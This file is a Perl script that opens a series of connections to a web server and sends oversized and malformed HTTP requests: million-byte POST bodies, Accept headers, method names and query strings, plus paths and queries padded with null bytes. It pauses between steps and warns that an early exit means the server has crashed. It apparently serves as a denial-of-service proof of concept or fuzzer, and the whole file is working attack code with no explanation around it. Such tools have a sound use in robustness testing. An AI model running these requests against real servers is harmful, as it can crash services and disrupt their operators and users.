#!/usr/bin/perl



use Socket;
sub newdata {
                #my $self = shift;
                my ($nfound,$timeout,$rin,$rout)=(0,0.2,"");
                vec($rin,fileno(shift()),1)=1;
                $nfound=select($rout=$rin,undef,undef,$timeout);
                return $nfound;
};


my $host = shift;
my $port = shift || 80;
print "\n\tWARNING: If program exit before msg that's mean that the server crashed or something happened to server\n\n";
$saddr=sockaddr_in($port,inet_aton($host));
$SIG{PIPE}=NULL;


socket(SOCK,AF_INET,SOCK_STREAM,6) or print "Died";
print "a normal connection\n";
<STDIN>;
connect(SOCK,$saddr) or exit;
print "Connected\n";
$header="GET / HTTP/1.0\r\nConnection: Keep-Alive\r\nUser-Agent: Mozilla/4.73 [en] (X11; U; Linux 2.4.12 i686)\r\nHost: localhost:81\r\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\r\nAccept-Encoding: gzip\r\nAccept-Language: en\r\nAccept-Charset: iso-8859-1,*,utf-8\r\n\r\n";
syswrite(SOCK,"$header");
$keep=1;
while($keep) {
        if(newdata(SOCK)) {
                if(($data=<SOCK>)) {
                        print "Read: ".$data;
                }else {
			$keep=0;
                };
        };
};
close(SOCK);



socket(SOCK,AF_INET,SOCK_STREAM,6) or exit;
print "Trying to send (nothing) press (enter) to continue\n";
<STDIN>;
connect(SOCK,$saddr) or exit;
print "Connected\n";
$header="";
syswrite(SOCK,"$header");
$keep=1;
while($keep) {
        if(newdata(SOCK)) {
                if(($data=<SOCK>)) {
                        print "Read: ".$data;
                }else {
			$keep=0;
                };
        };
};
close(SOCK);


socket(SOCK,AF_INET,SOCK_STREAM,6) or print "Died";
print "a post (foo)value with 10000000 bytes press (enter) to continue\n";
<STDIN>;
connect(SOCK,$saddr) or exit;
print "Connected\n";
$header="POST / HTTP/1.0\r\nConnection: Keep-Alive\r\nUser-Agent: Mozilla/4.73 [en] (X11; U; Linux 2.4.12 i686)\r\nHost: localhost:81\r\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\r\nAccept-Encoding: gzip\r\nAccept-Language: en\r\nAccept-Charset: iso-8859-1,*,utf-8\r\n\r\ndev=".("a"x1000000)."&teste=1\r\n\r\n"; #big values
syswrite(SOCK,"$header");
$keep=1;
while($keep) {
        if(newdata(SOCK)) {
                if(($data=<SOCK>)) {
                        print "Read: ".$data;
                }else {
			$keep=0;
                };
        };
};
close(SOCK);

socket(SOCK,AF_INET,SOCK_STREAM,6) or exit;
print "Trying to send a big data for ClientInfo\n";
<STDIN>;
connect(SOCK,$saddr) or exit;
print "Connected\n";
$header="GET / HTTP/1.0\r\nConnection: Keep-Alive\r\nUser-Agent: Mozilla/4.73 [en] (X11; U; Linux 2.4.12 i686)\r\nHost: localhost:81\r\nAccept: ".("a"x1000000)."\r\nAccept-Encoding: gzip\r\nAccept-Language: en\r\nAccept-Charset: iso-8859-1,*,utf-8\r\n\r\n"; 
syswrite(SOCK,"$header");
$keep=1;
while($keep) {
        if(newdata(SOCK)) {
                if(($data=<SOCK>)) {
                        print "Read: ".$data;
                }else {
			$keep=0;
                };
        };
};
close(SOCK);

socket(SOCK,AF_INET,SOCK_STREAM,6) or exit;
print "Change method by a big name\n";
<STDIN>;
connect(SOCK,$saddr) or exit;
print "Connected\n";
$header=("a"x1000000)." / HTTP/1.0\r\nConnection: Keep-Alive\r\nUser-Agent: Mozilla/4.73 [en] (X11; U; Linux 2.4.12 i686)\r\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\r\nAccept-Encoding: gzip\r\nAccept-Language: en\r\nAccept-Charset: iso-8859-1,*,utf-8\r\n\r\n"; 
syswrite(SOCK,"$header");
$keep=1;
while($keep) {
        if(newdata(SOCK)) {
                if(($data=<SOCK>)) {
                        print "Read: ".$data;
                }else {
			$keep=0;
                };
        };
};
close(SOCK);

socket(SOCK,AF_INET,SOCK_STREAM,6) or exit;
print "big query value\n";
<STDIN>;
connect(SOCK,$saddr) or exit;
print "Connected\n";
$header="GET /?teste=".("a"x1000000)." / HTTP/1.0\r\nConnection: Keep-Alive\r\nUser-Agent: Mozilla/4.73 [en] (X11; U; Linux 2.4.12 i686)\r\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\r\nAccept-Encoding: gzip\r\nAccept-Language: en\r\nAccept-Charset: iso-8859-1,*,utf-8\r\n\r\n"; 
syswrite(SOCK,"$header");
$keep=1;
while($keep) {
        if(newdata(SOCK)) {
                if(($data=<SOCK>)) {
                        print "Read: ".$data;
                }else {
			$keep=0;
                };
        };
};
close(SOCK);

socket(SOCK,AF_INET,SOCK_STREAM,6) or exit;
print "requestname filled w 0's\n";
<STDIN>;
connect(SOCK,$saddr) or exit;
print "Connected\n";
$header="GET /".("\0"x1000000)." HTTP/1.0\r\nConnection: Keep-Alive\r\nUser-Agent: Mozilla/4.73 [en] (X11; U; Linux 2.4.12 i686)\r\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\r\nAccept-Encoding: gzip\r\nAccept-Language: en\r\nAccept-Charset: iso-8859-1,*,utf-8\r\n\r\n"; 
syswrite(SOCK,"$header");
$keep=1;
while($keep) {
        if(newdata(SOCK)) {
                if(($data=<SOCK>)) {
                        print "Read: ".$data;
                }else {
			$keep=0;
                };
        };
};
close(SOCK);

socket(SOCK,AF_INET,SOCK_STREAM,6) or exit;
print "query filled w 0's\n";
<STDIN>;
connect(SOCK,$saddr) or exit;
print "Connected\n";
$header="GET /teste?teste=".("\0"x1000000)." HTTP/1.0\r\nConnection: Keep-Alive\r\nUser-Agent: Mozilla/4.73 [en] (X11; U; Linux 2.4.12 i686)\r\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\r\nAccept-Encoding: gzip\r\nAccept-Language: en\r\nAccept-Charset: iso-8859-1,*,utf-8\r\n\r\n"; 
syswrite(SOCK,"$header");
$keep=1;
while($keep) {
        if(newdata(SOCK)) {
                if(($data=<SOCK>)) {
                        print "Read: ".$data;
                }else {
			$keep=0;
                };
        };
};
close(SOCK);

socket(SOCK,AF_INET,SOCK_STREAM,6) or print "Died";
print "a post (foo)value with 10000000 bytes press (enter) to continue\n";
<STDIN>;
connect(SOCK,$saddr) or exit;
print "Connected\n";
$header="POST / HTTP/1.0\r\nConnection: Keep-Alive\r\nUser-Agent: Mozilla/4.73 [en] (X11; U; Linux 2.4.12 i686)\r\nHost: localhost:81\r\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\r\nAccept-Encoding: gzip\r\nAccept-Language: en\r\nAccept-Charset: iso-8859-1,*,utf-8\r\n\r\ndev=teste".("\0"x1000000)."&teste=1\r\n\r\n"; #big values
syswrite(SOCK,"$header");
$keep=1;
while($keep) {
        if(newdata(SOCK)) {
                if(($data=<SOCK>)) {
                        print "Read: ".$data;
                }else {
			$keep=0;
                };
        };
};

print "--------- END --------\n"
